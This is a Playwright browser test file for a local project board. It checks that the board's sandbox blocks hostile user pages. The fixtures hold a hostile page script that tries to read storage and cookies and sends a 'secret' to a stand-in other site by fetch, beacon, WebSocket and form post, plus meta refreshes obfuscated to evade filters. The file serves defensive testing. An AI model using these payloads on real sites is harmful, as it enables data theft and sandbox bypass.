// T1001: the board's pages route in a browser. A hostile page cannot fetch the board, read the board's storage, submit
// a form or reach another server, and runs no script of its own unless the owner opens it with ?scripts=1; a sage
// message page's Today switch works, but no meta refresh moves a page that holds it (F-T1013-1); the task index links
// its pages; and a person's click on another site opens a page, while a navigation that no person started does not (F6). It starts the real board server on a free loopback port
// (never 4173 or 43123) over a SAMPLE logbook and a SAMPLE pages folder in a temporary folder, and a second server on
// another free port that stands for another site and counts each request that reaches it. It runs in
// `npm run test:browser`, not in `npm test`, with Playwright's bundled Chromium, or the headless shell at
// BOARD_BROWSER_PATH; never an installed Chrome.
import "./test-env.mjs";
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { createServer as createHttpServer } from "node:http";
import { createRequire } from "node:module";
import { createServer } from "node:net";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { after, before, test } from "node:test";
import { fileURLToPath } from "node:url";
import { createBoardServer } from "../packages/sage-board/server.mjs";
import { renderMessage } from "../packages/sage-core/message-checks.mjs";
import { SWITCH_SCRIPT } from "../packages/sage-core/message-page.mjs";

const require = createRequire(import.meta.url);
const { chromium } = require("playwright");
const HERE = dirname(fileURLToPath(import.meta.url));
const HEADERS = ["id title size risk route state branch pr round keys", "id task role round candidate branch status tokens report started ended", "task key round source severity summary triage reason status", "task pr sha kind cycle run at", "id task question options recommendation default answer at", "at task decision why"];
const NAMES = ["tasks", "runs", "findings", "ledger", "gates", "decisions"];
const LOGBOOK = "project-abcdef";

/** A free loopback port that is not one of the owner's own (4173, 43123). */
async function freePort() {
  for (;;) {
    const socket = createServer();
    await new Promise((accept, reject) => { socket.once("error", reject); socket.listen(0, "127.0.0.1", accept); });
    const { port } = socket.address();
    await new Promise((accept) => socket.close(accept));
    if (![4173, 43123].includes(port)) return port;
  }
}

const dir = mkdtempSync(join(realpathSync(tmpdir()), "sage-board-pages-browser-"));
const book = join(dir, "source", LOGBOOK), pages = join(dir, "worktrees", LOGBOOK, "pages", "T1");
mkdirSync(book, { recursive: true });
NAMES.forEach((table, i) => writeFileSync(join(book, `${table}.tsv`), `${HEADERS[i].replaceAll(" ", "\t")}\n`));
writeFileSync(join(book, "tasks.tsv"), `${HEADERS[0].replaceAll(" ", "\t")}\nT1\tSample task\tsmall\t\tbuild\tframed\tsample/t1\t\t0\t\n`);
mkdirSync(pages, { recursive: true });

let browser, board, boardPort, other, otherPort, before_;
const reached = []; // each request that reaches the other site
const heard = new Map(); // the headers of each such request, by its address
const at = (path) => `http://127.0.0.1:${boardPort}/pages/${LOGBOOK}/T1/${path}`;

/**
 * The hostile page: each way to reach the board, the board's storage or another server, done at once by its own
 * script, which also writes what it saw in the page. Without its script, the markup still tries an image, a style, a
 * meta refresh is in its own page below.
 */
const hostile = (other) => `<!DOCTYPE html><html><head><title>SAMPLE hostile page</title><link rel="stylesheet" href="${other}/style"><script src="${other}/script"></script></head><body>
<p id="out">no script ran</p><img src="${other}/image" alt=""><img src="/pages/${LOGBOOK}/T1/research.html" alt="">
<form id="form" method="post" action="${other}/form"><input name="data" value="SAMPLE secret"></form>
<script>
(async () => {
  const out = [];
  document.body.dataset.ran = "yes";
  try { out.push("storage read: " + localStorage.getItem("sage-sample")); } catch (e) { out.push("storage: " + e.name); }
  try { out.push("cookie read: " + document.cookie); } catch (e) { out.push("cookie: " + e.name); }
  for (const [name, url] of [["board", "${at("research.html").replace(/\/pages\/.*$/, "/")}"], ["page", "${at("research.html")}"], ["other", "${other}/fetch"]]) {
    try { const r = await fetch(url); out.push("fetch " + name + ": " + r.status); } catch (e) { out.push("fetch " + name + ": " + e.name); }
  }
  try { new WebSocket("${other.replace("http", "ws")}/socket"); out.push("socket: made"); } catch (e) { out.push("socket: " + e.name); }
  try { navigator.sendBeacon("${other}/beacon", "SAMPLE"); out.push("beacon: sent"); } catch (e) { out.push("beacon: " + e.name); }
  try { const w = window.open("${other}/popup"); out.push("popup: " + (w ? "opened" : "blocked")); } catch (e) { out.push("popup: " + e.name); }
  try { document.getElementById("form").submit(); out.push("form: submitted"); } catch (e) { out.push("form: " + e.name); }
  document.getElementById("out").textContent = out.join("; ");
  document.body.dataset.done = "yes";
})();
</script></body></html>`;

before(async () => {
  boardPort = await freePort(); otherPort = await freePort();
  const otherSite = `http://localhost:${otherPort}`; // localhost is another site than 127.0.0.1
  writeFileSync(join(pages, "hostile.html"), hostile(otherSite));
  writeFileSync(join(pages, "refresh.html"), `<!DOCTYPE html><title>SAMPLE</title><meta http-equiv="refresh" content="0; url=${otherSite}/refresh?data=SAMPLE"><p>SAMPLE refresh</p>`);
  writeFileSync(join(pages, "research.html"), "<!DOCTYPE html><title>SAMPLE research</title><p>SAMPLE research page</p>");
  writeFileSync(join(pages, "notes.txt"), "SAMPLE notes");
  writeFileSync(join(pages, "links.html"), `<!DOCTYPE html><title>SAMPLE links</title><a id="index" href="${at("")}">index</a> <a id="txt" href="${at("notes.txt")}">notes</a> <a id="scripts" href="${at("hostile.html")}?scripts=1">scripts</a>`);
  const design = JSON.parse(readFileSync(join(HERE, "fixtures", "messages", "07-design.json"), "utf8"));
  const message = renderMessage({ ...design, blocks: design.blocks.map((b) => (b.t === "page" ? { ...b, path: `/pages/${b.task}/${b.file}` } : b)) }, { pagePath: (name) => join(pages, name) });
  assert.ok(message.page, "the design message has a page");
  writeFileSync(join(pages, "design.html"), message.page.html);
  // F-T1013-1: sage's own message page, with its exact switch script, and a meta refresh to the other site added.
  const refresh = (meta) => message.page.html.replace("<title>", `${meta}<title>`);
  writeFileSync(join(pages, "switch-refresh.html"), refresh(`<meta http-equiv="refresh" content="0;url=${otherSite}/switch-refresh?data=SAMPLE">`));
  writeFileSync(join(pages, "switch-odd.html"), refresh(`<META\n  HTTP-EQUIV = 'Refresh' CONTENT='0;url=${otherSite}/switch-odd?data=SAMPLE'>`));
  writeFileSync(join(pages, "switch-entity.html"), refresh(`<meta http-equiv=&#x72;efresh content=0;url=${otherSite}/switch-entity?data=SAMPLE>`));
  // F-T1013-2: the browser reads the policy-like tag as the value of a, and http-equiv=refresh as the outer meta's.
  writeFileSync(join(pages, "switch-quote.html"), refresh(`<meta a='<meta http-equiv="Content-Security-Policy" content="' http-equiv=refresh content='0;url=${otherSite}/switch-quote?data=SAMPLE'">`));
  // F-T1013-6: a srcdoc value is decoded and read as a new page, whose refresh moves the frame.
  writeFileSync(join(pages, "switch-srcdoc.html"), refresh(`<iframe srcdoc="&lt;meta http&#45;equiv=&quot;refresh&quot; content=&quot;0;url=${otherSite}/switch-srcdoc?data=SAMPLE&quot;&gt;"></iframe>`));
  // F-T1013-5: a prerender link in a page with no script.
  writeFileSync(join(pages, "prerender.html"), `<!DOCTYPE html><title>SAMPLE</title><link rel="prerender" href="${otherSite}/prerender?data=SAMPLE"><p>SAMPLE prerender</p>`);
  // A UTF-16 byte order mark: the browser reads the refresh in UTF-16, while the switch script's bytes stay in UTF-8.
  writeFileSync(join(pages, "switch-utf16.html"), Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(`<!DOCTYPE html><meta http-equiv="refresh" content="0;url=${otherSite}/switch-utf16?data=SAMPLE"><p>SAMPLE</p>`, "utf16le"), Buffer.from(`<script>${SWITCH_SCRIPT}</script>`)]));
  // The other site: it counts each request, and serves a page with a link to the board's page and a script that moves to it.
  other = createHttpServer((request, response) => {
    if (request.url === "/" || request.url === "/auto") {
      response.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
      return response.end(`<!DOCTYPE html><title>other site</title><a id="go" href="${at("research.html")}">page</a> <a id="scripts" href="${at("hostile.html")}?scripts=1">scripts</a> <a id="index" target="_blank" rel="opener" href="${at("")}">index</a>${request.url === "/auto" ? `<script>setTimeout(() => { location.href = ${JSON.stringify(at("research.html"))}; }, 50)</script>` : ""}`);
    }
    reached.push(request.url); heard.set(request.url, request.headers);
    response.writeHead(204); response.end();
  });
  await new Promise((accept) => other.listen(otherPort, "127.0.0.1", accept));
  before_ = process.env.SAGE_WORKTREES;
  process.env.SAGE_WORKTREES = join(dir, "worktrees");
  board = createBoardServer({ sources: [{ id: "sample", path: join(dir, "source") }], port: boardPort });
  await board.start();
  browser = await chromium.launch({ headless: true, ...(process.env.BOARD_BROWSER_PATH ? { executablePath: process.env.BOARD_BROWSER_PATH } : {}) });
});

after(async () => {
  try { await browser?.close(); } finally {
    await board?.close(); await new Promise((accept) => other ? other.close(accept) : accept());
    if (before_ === undefined) delete process.env.SAGE_WORKTREES; else process.env.SAGE_WORKTREES = before_;
    rmSync(dir, { recursive: true, force: true });
  }
});

/** A new browser context whose board origin keeps a value in its storage, as the board keeps the owner's theme. */
async function context(t) {
  const ctx = await browser.newContext();
  t.after(() => ctx.close());
  const page = await ctx.newPage();
  assert.equal((await page.goto(`http://127.0.0.1:${boardPort}/`)).status(), 200);
  await page.evaluate(() => localStorage.setItem("sage-sample", "SAMPLE board value"));
  return { ctx, page };
}

test("a hostile page runs no script of its own and reaches nothing: no image, style or refresh from another site", async (t) => {
  const { page } = await context(t);
  reached.length = 0;
  const response = await page.goto(at("hostile.html"));
  assert.equal(response.status(), 200);
  assert.match(response.headers()["content-security-policy"], /^sandbox; /);
  assert.equal(await page.locator("#out").textContent(), "no script ran");
  assert.equal(await page.evaluate(() => document.body.dataset.ran ?? "no"), "no");
  // A meta refresh is no script, but a sandbox without scripts stops it too.
  const refresh = await page.goto(at("refresh.html"));
  assert.equal(refresh.status(), 200);
  await page.waitForTimeout(500); // the refresh's 0 s, and time for any request to arrive; the page must stay
  assert.equal(new URL(page.url()).port, String(boardPort), "the refresh did not move the page");
  assert.deepEqual(reached, [], "nothing reached the other site");
});

test("with ?scripts=1 a hostile page's own script runs, but it cannot fetch the board, read its storage, submit a form or reach another site", async (t) => {
  const { page } = await context(t);
  reached.length = 0;
  const response = await page.goto(`${at("hostile.html")}?scripts=1`);
  assert.equal(response.status(), 200);
  await page.waitForFunction(() => document.body.dataset.done === "yes");
  const out = await page.locator("#out").textContent();
  assert.match(out, /storage: SecurityError/, out);
  assert.match(out, /cookie: SecurityError/, out);
  assert.match(out, /fetch board: TypeError; fetch page: TypeError; fetch other: TypeError/, out);
  assert.match(out, /popup: blocked/, out);
  assert.equal(new URL(page.url()).pathname, `/pages/${LOGBOOK}/T1/hostile.html`, "the form did not move the page");
  await page.waitForTimeout(500); // time for any request that got out to arrive
  assert.deepEqual(reached, [], "nothing reached the other site");
  // The board's own value is still there, in the board's own origin.
  await page.goto(`http://127.0.0.1:${boardPort}/`);
  assert.equal(await page.evaluate(() => localStorage.getItem("sage-sample")), "SAMPLE board value");
});

test("a sage message page's Today switch works under the sandbox", async (t) => {
  const { page } = await context(t);
  const errors = [];
  page.on("pageerror", (error) => errors.push(String(error)));
  assert.equal((await page.goto(at("design.html"))).status(), 200);
  const today = page.locator(".tg-bar button[data-v=today]").first();
  await today.click();
  assert.equal(await today.getAttribute("aria-pressed"), "true");
  assert.equal(await page.locator(".tg").first().evaluate((el) => el.classList.contains("show-today")), true);
  assert.equal(await page.locator(".tg-today").first().isVisible(), true);
  assert.equal(await page.locator(".tg-after").first().isVisible(), false);
  assert.deepEqual(errors, []);
});

test("F-T1013-1: a page with sage's switch script and a meta refresh, in any spelling, stays on the Mac and reaches nothing", async (t) => {
  const { page } = await context(t);
  for (const name of ["switch-refresh.html", "switch-odd.html", "switch-entity.html", "switch-quote.html", "switch-srcdoc.html", "switch-utf16.html"]) {
    reached.length = 0;
    const response = await page.goto(at(name));
    assert.equal(response.status(), 200, name);
    await page.waitForTimeout(500); // the refresh's 0 s, and time for any request to arrive; the page must stay
    assert.deepEqual(reached, [], `${name}: nothing reached the other site`);
    assert.equal(page.url(), at(name), `${name}: the refresh did not move the page`);
    assert.match(response.headers()["content-security-policy"], /^sandbox; /, `${name}: the page runs no script`);
  }
});

// F-T1013-5: this pins a limit, not a guard. Chromium 140 sends a prerender link's request (NoStatePrefetch), and no
// header that the board can send stops it (CSP, Permissions-Policy, COOP and COEP, Vary and others were tried). A build
// without NoStatePrefetch sends none, so the test takes either; the request carries only its address, and the page stays.
test("F-T1013-5: a prerender link in a page with no script can ask another site for its address, with no referrer, and the page stays", async (t) => {
  const { page } = await context(t);
  reached.length = 0;
  const response = await page.goto(at("prerender.html"));
  assert.match(response.headers()["content-security-policy"], /^sandbox; /);
  for (let i = 0; i < 15 && !reached.length; i++) await page.waitForTimeout(100);
  await page.waitForTimeout(300); // time for any second request to arrive
  t.diagnostic(`the prerender request ${reached.length ? "reached" : "did not reach"} the other site in this browser`);
  assert.ok(reached.length === 0 || reached.join() === "/prerender?data=SAMPLE", `only the address of the link: ${reached.join()}`);
  if (reached.length) assert.equal(heard.get(reached[0]).referer, undefined, "no referrer");
  assert.equal(page.url(), at("prerender.html"));
});

test("the task index opens its pages, and its scripts link runs a page's own script", async (t) => {
  const { page } = await context(t);
  assert.equal((await page.goto(at("")).then((r) => r.status())), 200);
  const [research] = await Promise.all([page.waitForResponse(at("research.html")), page.locator(`a[href="/pages/${LOGBOOK}/T1/research.html"]`).click()]);
  assert.equal(research.status(), 200);
  assert.match(await page.textContent("body"), /SAMPLE research page/);
  await page.goBack();
  const [scripted] = await Promise.all([page.waitForResponse(`${at("hostile.html")}?scripts=1`), page.locator(`a[href="/pages/${LOGBOOK}/T1/hostile.html?scripts=1"]`).click()]);
  assert.equal(scripted.status(), 200);
  await page.waitForFunction(() => document.body.dataset.done === "yes");
});

test("F6: a person's click on another site opens a page; a move that no person started, and the scripts link, do not", async (t) => {
  const { page } = await context(t);
  await page.goto(`http://localhost:${otherPort}/`);
  const [opened] = await Promise.all([page.waitForResponse(at("research.html")), page.click("#go")]);
  assert.equal(opened.request().headers()["sec-fetch-site"] ?? (await opened.request().allHeaders())["sec-fetch-site"], "cross-site");
  assert.equal(opened.status(), 200);
  assert.match(await page.textContent("body"), /SAMPLE research page/);
  await page.goto(`http://localhost:${otherPort}/`);
  const [scripts] = await Promise.all([page.waitForResponse(`${at("hostile.html")}?scripts=1`), page.click("#scripts")]);
  assert.equal(scripts.status(), 403);
  const [auto] = await Promise.all([page.waitForResponse(at("research.html")), page.goto(`http://localhost:${otherPort}/auto`)]);
  assert.equal(auto.status(), 403);
});

test("a click on a link in a page opens another page of the board or the index, but not the scripts link", async (t) => {
  const { page } = await context(t);
  for (const [id, url, status] of [["#index", at(""), 200], ["#txt", at("notes.txt"), 200], ["#scripts", `${at("hostile.html")}?scripts=1`, 403]]) {
    await page.goto(at("links.html"));
    const [response] = await Promise.all([page.waitForResponse(url), page.click(id)]);
    assert.equal(response.status(), status, id);
  }
});

test("F-T1001-6: the index cuts the handle of another site that opened it, also for a page that it then opens with its scripts", async (t) => {
  const { ctx, page } = await context(t);
  await page.goto(`http://localhost:${otherPort}/`);
  const [index] = await Promise.all([ctx.waitForEvent("page"), page.click("#index")]);
  await index.waitForLoadState();
  assert.match(await index.textContent("h1"), /Pages of T1/);
  assert.equal(await index.evaluate(() => window.opener === null), true, "the index has no opener");
  await Promise.all([index.waitForURL(`${at("hostile.html")}?scripts=1`), index.locator(`a[href="/pages/${LOGBOOK}/T1/hostile.html?scripts=1"]`).click()]);
  await index.waitForFunction(() => document.body.dataset.done === "yes");
  assert.equal(await index.evaluate(() => window.opener === null), true, "the page that runs its scripts has no opener");
});

test("the index's warnings are notes that start with Warning, each scripts link names its page, and its small text has a contrast of at least 4.5:1", async (t) => {
  const { page } = await context(t);
  for (const colorScheme of ["light", "dark"]) {
    await page.emulateMedia({ colorScheme });
    await page.goto(at(""));
    const notes = page.getByRole("note");
    assert.equal(await notes.count(), 2, colorScheme);
    for (const text of await notes.allTextContents()) assert.match(text, /^Warning: /);
    const scripts = page.getByRole("link", { name: "Open hostile.html with its scripts", exact: true });
    assert.equal(await scripts.count(), 1, "the scripts link has its page in its name");
    assert.ok((await notes.nth(1).textContent()).includes(`"${await scripts.textContent()}"`), "the warning quotes the link as it reads");
    // WCAG 2 contrast of each small grey text against the page's own background (the Canvas colour of its scheme).
    const ratios = await page.evaluate(() => {
      const lum = (color) => { const [r, g, b] = color.match(/[\d.]+/g).slice(0, 3).map((v) => { v /= 255; return v <= 0.03928 ? v / 12.92 : ((v + 0.055) / 1.055) ** 2.4; }); return 0.2126 * r + 0.7152 * g + 0.0722 * b; };
      const probe = document.createElement("div");
      probe.style.background = "Canvas";
      document.body.append(probe);
      const bg = lum(getComputedStyle(probe).backgroundColor);
      probe.remove();
      return [...document.querySelectorAll(".m")].map((el) => { const fg = lum(getComputedStyle(el).color); return (Math.max(fg, bg) + 0.05) / (Math.min(fg, bg) + 0.05); });
    });
    assert.ok(ratios.length >= 2, "the logbook line and the sizes");
    for (const ratio of ratios) assert.ok(ratio >= 4.5, `${colorScheme}: ${ratio.toFixed(2)}:1`);
  }
});
